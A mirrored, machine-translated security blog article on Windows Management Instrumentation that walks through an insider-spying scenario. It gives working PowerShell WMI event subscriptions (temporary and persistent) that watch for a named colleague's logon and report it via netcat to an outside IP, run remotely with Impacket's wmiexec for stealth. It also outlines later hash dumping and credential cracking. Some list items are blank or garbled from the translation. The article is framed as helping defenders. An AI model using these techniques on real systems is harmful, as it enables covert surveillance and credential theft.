<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üëàüèª üëµüèª üåπ Windows Management Instrumentation (WMI) Guide: Understanding WMI Attacks üï¥üèø üòé üôåüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Windows Management Instrumentation (WMI) is a PowerShell subsystem that provides administrators with access to powerful system monitoring tools. This ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Windows Management Instrumentation (WMI) Guide: Understanding WMI Attacks</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/varonis/blog/507068/"><img src="https://habrastorage.org/webt/wm/nj/qv/wmnjqvqbgcfcfxcp3omsbeuk4xi.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windows Management Instrumentation (WMI) is a PowerShell subsystem that provides administrators with access to powerful system monitoring tools. This toolkit was conceived as a quick and effective system administration tool, but not everyone uses it for good purposes: with its help, insiders can spy on other employees. Knowing this WMI vulnerability makes it easier to detect and combat internal threats. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In this article, we will examine what WMI tools are, why they are needed, and how they can be used to track insider activity in the system. We have also compiled a more detailed guide on WMI events and insider espionage, which you can </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">download for free.</font></font></a><br>
<a name="habracut"></a><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Short review: what is WMI and what is it for?</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/0t/au/hp/0tauhpqfa_9fk8xebbdasj4e3je.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
We give a concrete example. </font><font style="vertical-align: inherit;">Using WMI, you can request, for example, all large Excel files located in a particular directory, and then receive a notification each time you create a file with a given size, for example 1 MB. </font><font style="vertical-align: inherit;">The </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Register-WmiEvent cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> allows </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">you</font></a><font style="vertical-align: inherit;"> to do all this with a single, not too complicated line in PowerShell. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In good hands, WMI can serve many good purposes, but it can also become a tool for malicious insider activity. </font><font style="vertical-align: inherit;">You can easily imagine how a person with the habits of Edward Snowden uses WMI to spy on his colleagues. </font><font style="vertical-align: inherit;">To do this, he does not even need special technical knowledge.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Suppose our hypothetical insider ‚Äúaccidentally‚Äù spied that his colleague Lex periodically downloads large Excel files containing social security numbers and other personal data of clients. </font><font style="vertical-align: inherit;">In this case, our inconspicuous insider can build something like this:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 5 WHERE TargetInstance isa 'CIM_DataFile' and TargetInstance.FileSize &gt; 2000000 and TargetInstance.Path = '\\Users\\lex\\Important' and targetInstance.Drive = 'C:‚Äô and targetInstance.Extension =‚Äôxlsx‚Äô‚Äù -Action $action </code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This code queries the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">CIM_DataFile</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> object </font><font style="vertical-align: inherit;">to access information about creating the Excel file in the specified directory, and then starts the execution of the script block. </font><font style="vertical-align: inherit;">Toward the end of this article, we‚Äôll take a closer look at what this scenario block might look like in the case of our hypothetical insider.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">What is the Windows Management Toolkit used for?</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Before we move on to exploring how WMI can be used by insiders for tracking purposes, it is worth noting that it has many legitimate uses. </font><font style="vertical-align: inherit;">The global purpose of this system is to bring together all the controls for devices and applications in corporate networks. </font><font style="vertical-align: inherit;">Thus, WMI can be used:</font></font><br>
<br>
<ul>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to collect information about the status of local and remote computer systems </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">security settings for remote computers and applications</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setting and editing system properties</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">setting and editing permissions for authorized users and groups</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">code execution and serialization of objects (a </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kind of "SSH on steroids"</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">assign and edit drive labels</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">creating a process schedule</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">backup object repositories</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">enable and disable error logging</font></font></li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
All of these features can be accessed using PowerShell and WMIC, the WMI command-line interface. </font><font style="vertical-align: inherit;">As you can see, WMI has a wide variety of applications, and this system allows you to track and edit many different parameters on a computer network.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Windows Management Instrumentation Architecture</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/2w/tf/ij/2wtfijgpvxpx9nijaapuk9a74gg.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The WMI toolkit is part of the Windows operating system, and it is pre-installed on all operating systems starting with Windows 2000. WMI consists of the following components:</font></font><br>
<br>
<ul>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The WMI service</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is an implementation of the WMI system on Windows. </font><font style="vertical-align: inherit;">This process appears under the name ‚ÄúWindows Management Instrumentation‚Äù and is the link between the WMI providers, the WMI repository, and the management applications. </font><font style="vertical-align: inherit;">This process starts automatically when you turn on the computer.</font></font></li>
<li><strong> </strong> ‚Äî        ,      WMI.        ,  WMI        ,       Windows,    .</li>
<li><strong> WMI </strong> ‚Äî  ,       .      WMI   ,      .        Windows.</li>
<li><strong> </strong>  WMI     WMI.      ,     .   WMI       .</li>
<li><strong></strong>,     ,         . ,           .              .</li>
<li><strong> WMI</strong> ‚Äî   ,      ,   WMI.      .         WMI.</li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The CMI object manager</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is a system that sits between the management application and the WMI providers. </font><font style="vertical-align: inherit;">She requests data from these providers and then transfers it to the application.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The WMI API</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> performs these operations and provides applications with access to the WMI infrastructure without being tied to the type of device used.</font></font></li>
<li><strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">A WMI consumer</font></font></strong><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is an entity that sends requests to objects through the object manager. </font><font style="vertical-align: inherit;">Typically, a WMI consumer is a monitoring application, such as the PRTG Network Monitor, running the application or a PowerShell script.</font></font></li>
</ul><br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Making WMI Requests</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The easiest way to execute a WMI request is to run WMIC on a standard Windows command line. </font><font style="vertical-align: inherit;">Follow these steps to get information about the processor used on the local computer:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Open command prompt</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Type WMIC to invoke the program and press Enter </font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">The WMIC command prompt window will appear.</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">At the command prompt, you can execute WMI requests. </font><font style="vertical-align: inherit;">The simplest request is to view information about the local processor, which can be performed using the following command:</font></font><br>
<pre><code class="plaintext hljs">WMIC CPU</code></pre><br>
</li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Results will be displayed on the command line.</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Almost all the commands that will be discussed below are executed in this way. </font><font style="vertical-align: inherit;">However, WMI allows you to receive much more detailed information than processor information, including from remote computers and applications.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Workshop on using WMI events to monitor a system</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In this section, we will look at how to use WMI to execute commands and monitor processes on remote computers. </font><font style="vertical-align: inherit;">Such techniques can be used as part </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">of the user and entity behavior analysis system (UEBA)</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to automatically monitor processes throughout the system and </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">check for insider threats</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , which are evidenced by suspicious behavior or abnormal events.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Using wmiexec functionality from Impacket</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In WMI, you can perform various functions besides event management. In it, you can start processes and execute commands in Windows windows on both local and remote computers. For fun, try entering the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmic</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> process call create 'notepad.exe' command in a PowerShell session to open the old Microsoft text editor. It uses the wonderful wmic command line tool included with WMI. Great, right? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
If I added the / Node: option, and then the name of the remote Windows computer, I could run Notepad on it, provided that I have the appropriate permissions. It is clear that at a practical level, wmic is an indispensable tool for system administrators.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Before you begin to resent: I know that there are equivalent </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PowerShell cmdlets</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . However, I find wmic syntax easier to remember. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It would be great if I could use WMI to create a simple and invisible pseudo-shell.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/gu/nl/1j/gunl1jzoplcyeo2axlgjwd6bifw.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 A hidden pseudo-shell created with wmiexec. </font></font><br>
 <br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
To my luck, this can be done in Impacket. In the Amazon test environment, I used my favorite </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">wmiexec</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> to access WMI through the Linux virtual machine. Wmiexec provides the ability to create a pseudo-shell: each time a command is entered on the client side, a separate shell is created on the target computer to execute this command. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Both psexec and smbexec use Windows services to run commands on a remote system. Smbexec runs silently because it quickly creates and then deletes the service, and psexec, on the contrary, leaves it in sight.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/vk/mb/ik/vkmbiktrjf4cn49ihyxvhp12u0w.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 The wmiexec tool directly runs cmd.exe to execute the command remotely. </font><font style="vertical-align: inherit;">The created command can be found in the event viewer. </font><font style="vertical-align: inherit;">Note that we have avoided the attention- </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
grabbing </font><font style="vertical-align: inherit;">Windows services. </font><font style="vertical-align: inherit;">The wmiexec tool does not affect services at all, instead using the WMI features described above to start the process directly. </font><font style="vertical-align: inherit;">When looking for possible sources of threats, security experts rarely start with WMI, while services are usually a good place to start looking for evidence of an attack. </font><font style="vertical-align: inherit;">Good move, wmiexec!</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Using WMI Events to Monitor Users</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
While I was amusing myself with the thought that I was so smart and experimenting with WMI, it turned out that the guys involved in penetration tests had long understood how everything worked. You definitely need to read </font><font style="vertical-align: inherit;">Matt Graeber‚Äôs </font><font style="vertical-align: inherit;">amazing </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">presentation</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> from the 2015 Black Hat conference, where he talks about how attackers can turn WMI and its entire event arsenal into a hacking tool. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In my story, I imagine an insider a la Snowden who has some technical knowledge, but not deep hacking wisdom, and who is trusted by other employees. This person does not need to know everything about WMI. He needs to know only what is required to work on a remote computer and trigger events.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
In addition to file objects, there is another interesting class of objects that can be learned using WMI, </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">win32_LogOnSession</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Querying this basic Windows object allows you to find the users who are currently on the system. You can then use the Register-WmiEvent action script block to run the PowerShell script when a new user logs on remotely. Got the point? An attacker can receive notifications every time a user that he monitors logs into the target system. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Here is what I sketched:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" ‚ÄìAction $action</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The next question is how to program the execution of a script block. A mysterious insider from my fantasies is interested in a specific user - Cruell. Our villain was slowly spying on Cruella and now plans to use the collected information to crack her working account. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The task of the script block is to check who is logged in and determine if it was Cruella. I wrote a few lines of PowerShell code for this purpose, but this is clearly not the best way. I do not use the event information transmitted to the script block, namely the information about the new user. I run into obstacles, the reasons for which I can not understand at the moment. This requires more technical knowledge than our hypothetical insider has or is ready to acquire.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Instead, I simply went over the list of users returned by gwmi Win32_Process (try running this cmdlet in a PowerShell session) and matched them with the Cruell parameter. </font><font style="vertical-align: inherit;">You can admire my final decision:</font></font><br>
<br>
<pre><code class="plaintext hljs">Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {<font></font>
<font></font>
$names=gwmi Win32_Process|% { $_.GetOwner().User}<font></font>
foreach ($user in $names){<font></font>
<font></font>
    if ($user -eq "cruella") {<font></font>
<font></font>
        echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80<font></font>
    }<font></font>
}<font></font>
<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Register-WmiEvent allows you to maintain stealth, since it only starts when you log in again, instead of regularly requesting the Win32_Process object, which can be quite noticeable. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Remember that our insider tries not to attract attention. </font><font style="vertical-align: inherit;">She has access to the remote system through psexec, smbexec or wmiexec (the most inconspicuous way). </font><font style="vertical-align: inherit;">However, she does not need to constantly roam back and forth around the victim‚Äôs system. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
This is the beauty of using WMI events. </font><font style="vertical-align: inherit;">You can wait for notification from Register-WmiEvent, and then calmly make your move.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat and WMI Integration</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
But how does the script bring the hot news that Cruella is logged on to the target computer? </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
If you notice that I used the Netcat commands above, you can give yourself a plus. </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Netcat</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> is a well-known and universal utility that allows you to establish connections (optional for malware). With it, you can perform a reverse connection or simply send messages over the network. I took this second opportunity. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The above script sends a Netcat message in standby mode and displays ‚ÄúCruella logged in.‚Äù Mission accomplished. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
You can imagine how our scammer then dumps hashes with the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">secretsdump Impacket tool</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">, crack the Cruella credentials hash, then launch wmiexec, using Cruella permissions, to search for more valuable data.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/ca/en/ni/caennizhyw6u4_yuldedujkbowa.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Register-WmiEvent code can be run directly. </font><font style="vertical-align: inherit;">Pay attention to the displayed event identifier</font></font><br>
 <br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Troubleshooting WMI Monitoring</font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
As part of this example, I wanted to remotely run (using wmiexec) a useful program that would alert me when a particular user, that is, Cruella, logs in. After that, I could safely reset and crack her credentials. This would be the most inconspicuous way - remote access and no files. The only problem, it seemed to me at first, was the temporary nature of the WMI events. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Therefore, I needed to enclose my obscene long Register-WMIEvent (below) in the PowerShell command line with the ‚Äìnoexit parameter, which ensures that the PowerShell session is saved after Register-Event, and, therefore, the event is saved.</font></font><br>
<br>
<pre><code class="plaintext hljs"> Register-WMIEvent -Query "Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3" -Action {$names=gwmi Win32_Process|% { $_.GetOwner().User};foreach ($user in $names){if ($user -eq "cruella") {echo "cruella logged in"| C:\Users\lex\Documents\nc.exe 172.31.19.75 80}}}
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
When I started working on this, I realized that I had to "convert" special characters such as $, "and |, and pass them as literals directly to PowerShell. </font><font style="vertical-align: inherit;">Another headache: I ended up having to abandon the use of vertical lines because they caused analysis errors. </font><font style="vertical-align: inherit;">Do not ask. </font><font style="vertical-align: inherit;">Gradually, I came to this long line of code:</font></font><br>
<br>
<pre><code class="plaintext hljs">$command="powershell -noexit -C Register-WMIEvent -Query ""Select TargetInstance From __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'win32_LogOnSession' AND TargetInstance.LogonType=3"" -Action {`$names = gwmi Win32_Process; `$users=@(); foreach (`$n in `$names) {`$users += `$n.GetOwner().User}; foreach (`$u in `$users) {if (`$u -eq ""cruella"") {.\wmiexec C:\Users\lex\Documents\nc.exe 172.31.18.92 80 }}}<font></font>
.\wmiexec.exe corp.acme/lex@172.31.46.115 "$command"<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
It looked promising and seemed to work correctly according to the Windows event log in the target system. </font><font style="vertical-align: inherit;">However, taking a closer look, I realized that it does not work. </font><font style="vertical-align: inherit;">I am sure that in the end I could bring it to the right form, but for this I would need time and coffee, a lot of coffee. </font><font style="vertical-align: inherit;">There is another option, a little less inconspicuous and not fileless at all: you can use smbclient to transfer the script and then run it directly on the target computer.</font></font><br>
<br>
<p><img src="https://habrastorage.org/webt/qo/vq/jc/qovqjcy0lqzkf5v3bvaxglub5eu.jpeg"></p><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
 Remotely executing the complex Register-Event cmdlet seemed to me absolutely correct. </font><font style="vertical-align: inherit;">But it did not work. </font><font style="vertical-align: inherit;">Well, </font></font><br>
 <br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
alas. Alas, at this stage, my assumptions that a smart, but not too experienced insider could easily use WMI temporary events for covert surveillance began to fall apart.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Why should constant events be used for observation? </font></font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
The correct and at the same time requiring more in-depth knowledge is to use persistent WMI events. Permanent WMI events, although they are of some complexity, are not only a more effective tool for insider spies than temporary events, but they also allow you to more effectively monitor internal threats. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Studying persistent events will take some time, but they represent the most effective way to implement a rigorous monitoring system for large systems. They have more capabilities than temporary WMI events. They can also be used to alert you of non-standard malicious activity, such as DNS tunneling or </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;">Zero Trust</font></a><font style="vertical-align: inherit;"> policy violations </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">.</font></font></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I spent a couple of days studying persistent events and found that PowerShell has a special cmdlet that simplifies the process of creating an event filter, a consumer, and WMI objects between the filter and the consumer. As we all know, PowerShell provides administrators with ample opportunities to simplify their work. Unfortunately, this example shows how attackers can take advantage of these great features. </font></font><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
An insider creates a constant event on the target system, thereby freeing itself from the need to be present in a shell session. The event remains there forever or until it is explicitly deleted. You can read more about how to do this </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">here.</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">but overall the process is similar to what I did above with a temporary event. </font><font style="vertical-align: inherit;">The last thing our hacker needs is to associate an event filter with an event consumer. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
I agree that for an ordinary employee who suddenly decided to become an evil hacker, this looks too cool. </font><font style="vertical-align: inherit;">For the sake of interest, I read various </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">forums</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> and saw that many people are unsuccessfully struggling to get WMI constant events to work. </font><font style="vertical-align: inherit;">However, this does not go beyond the capabilities of our "Snowden" and other savvy system administrators who decided to switch to the dark side.</font></font><br>
<br>
<h2><font color="#D21927"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Constant Events: Tips for IT Admins</font></font></font></h2><br>
<img src="https://habrastorage.org/webt/8c/gh/rn/8cghrnfq5mao1zm9d5-95y2kdys.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
These methods are not intended to train potential hackers or offended employees who want to take revenge on the employer. </font><font style="vertical-align: inherit;">All I want to do is to help IT professionals understand the hacker's mindset so that they can implement appropriate protection against penetration attacks. </font><font style="vertical-align: inherit;">For them, I show how to configure the filter and consumer objects using the </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=en&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Set-WmiInstance cmdlet</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> :</font></font><br>
<br>
<pre><code class="plaintext hljs">$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{<font></font>
<font></font>
EventNamespace = 'root/cimv2'<font></font>
Name = ‚Äúcruella‚Äù<font></font>
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LoggedOnUser'"<font></font>
QueryLanguage = 'WQL'<font></font>
}<font></font>
<font></font>
<font></font>
$command = "powershell.exe -Command {$names = gwmi Win32_Process; $users=@(); foreach ($n in $names) {$users += $n.GetOwner().User}; foreach ($u in $users) {if ($u -eq 'cruella') { C:\users\lex\Documents\nc.exe 172.31.45.240 10000}}}"<font></font>
<font></font>
<font></font>
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{<font></font>
Name = "Consumer"<font></font>
CommandLineTemplate = $Command<font></font>
<font></font>
}<font></font>
</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Your homework is to come up with PowerShell code that links these two components together. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
